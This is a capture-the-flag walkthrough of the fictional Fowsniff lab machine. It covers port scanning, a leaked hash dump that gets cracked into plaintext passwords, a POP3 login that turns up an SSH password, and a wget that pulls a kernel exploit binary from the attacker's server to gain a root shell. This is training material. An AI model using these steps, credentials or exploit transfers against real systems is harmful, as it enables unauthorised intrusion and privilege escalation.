

initial nmap scan
```
└─$ sudo nmap -sV 10.10.252.153
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-10 13:13 PST
Nmap scan report for 10.10.252.153
Host is up (0.17s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.52 seconds

```

on 10.10.252.153 site
```
<p>Fowsniff's internal system suffered a data breach that
									resulted in the exposure of employee usernames and passwords.</p>

									<p><strong>Client information was not affected.</strong></p>

									<p>Due to the strong possibility that employee information has
									been  made publicly available, all employees have been
								  instructed to change their passwords immediately.</p>

									<p>The attackers were also able to hijack our official @fowsniffcorp Twitter account.
									All of our official tweets have been deleted and the attackers
									may release sensitive information via this medium. We are
```

gobuster scan
```
─$ gobuster dir -w common.txt -x php,html,txt,js -u 10.10.252.153
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.252.153
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,js,php,html
[+] Timeout:                 10s
===============================================================
2021/12/10 13:15:30 Starting gobuster in directory enumeration mode
===============================================================
/.hta.js              (Status: 403) [Size: 295]
/.hta.php             (Status: 403) [Size: 296]
/.hta.html            (Status: 403) [Size: 297]
/.hta.txt             (Status: 403) [Size: 296]
/.htaccess.php        (Status: 403) [Size: 301]
/.hta                 (Status: 403) [Size: 292]
/.htaccess.html       (Status: 403) [Size: 302]
/.htpasswd            (Status: 403) [Size: 297]                                                                    
/.htaccess.txt        (Status: 403) [Size: 301]                                                                    
/.htpasswd.php        (Status: 403) [Size: 301]                                                                    
/.htaccess.js         (Status: 403) [Size: 300]                                                                    
/.htpasswd.html       (Status: 403) [Size: 302]                                                                    
/.htaccess            (Status: 403) [Size: 297]                                                                    
/.htpasswd.txt        (Status: 403) [Size: 301]                                                                    
/.htpasswd.js         (Status: 403) [Size: 300]                                                                    
/assets               (Status: 301) [Size: 315] [--> http://10.10.252.153/assets/]                                 
/images               (Status: 301) [Size: 315] [--> http://10.10.252.153/images/]                                 
/index.html           (Status: 200) [Size: 2629]                                                                   
/index.html           (Status: 200) [Size: 2629]                                                                   
/LICENSE.txt          (Status: 200) [Size: 17128]                                                                  
/README.txt           (Status: 200) [Size: 1288]                                                                   
/robots.txt           (Status: 200) [Size: 26]                                                                     
/robots.txt           (Status: 200) [Size: 26]                                    
/security.txt         (Status: 200) [Size: 459]                                   
/server-status        (Status: 403) [Size: 301] 
```

searching Twitter, I found `FowsniffCorp Pwned!` tweet.
```
Is that your sysadmin? roflcopter
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
```

doing more online searching I found a pastbin dump
```
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4
 
-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.
 
All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.
 
Any similarities to actual people or entities is purely coincidental and occurred accidentally.
```

after cracking hashes
 ```
mauer@fowsniff:mailcall
mustikka@fowsniff:bilbo101
tegel@fowsniff:apples01
baksteen@fowsniff:skyler22
seina@fowsniff:scoobydoo2
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd -> uncracked
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972
 ```

Lets connect to POP3 via telnet using `seina:scoobydoo2`. This person has two messages!

message 1
```
└─$ telnet 10.10.252.153 110                                                                                       
Trying 10.10.252.153...
Connected to 10.10.252.153.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

message 2
```
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

```


Let's ssh in as `baksteen:S1ck3nBluff+secureshell`.
```
baksteen@fowsniff:~$ uname -a
Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
baksteen@fowsniff:~$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

```

Looking online, there is an exploit for this version of linux. I downloaded the code and compiled it on my machine. I then spun up a http server using python then downloaded it to the target machine.
```
baksteen@fowsniff:~$ wget 10.8.248.108:8000/exploit
--2021-12-11 17:48:34--  http://10.8.248.108:8000/exploit
Connecting to 10.8.248.108:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17304 (17K) [application/octet-stream]
Saving to: ‘exploit’

exploit                      100%[=============================================>]  16.90K   102KB/s    in 0.2s    

2021-12-11 17:48:35 (102 KB/s) - ‘exploit’ saved [17304/17304]

baksteen@fowsniff:~$ ./exploit
-bash: ./exploit: Permission denied
baksteen@fowsniff:~$ chmod +x exploit
baksteen@fowsniff:~$ ./exploit
task_struct = ffff88001f202a00
uidptr = ffff88001eca10c4
spawning root shell
root@fowsniff:~# whoami
root

```

```
root@fowsniff:/root# cat flag.txt
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.


```
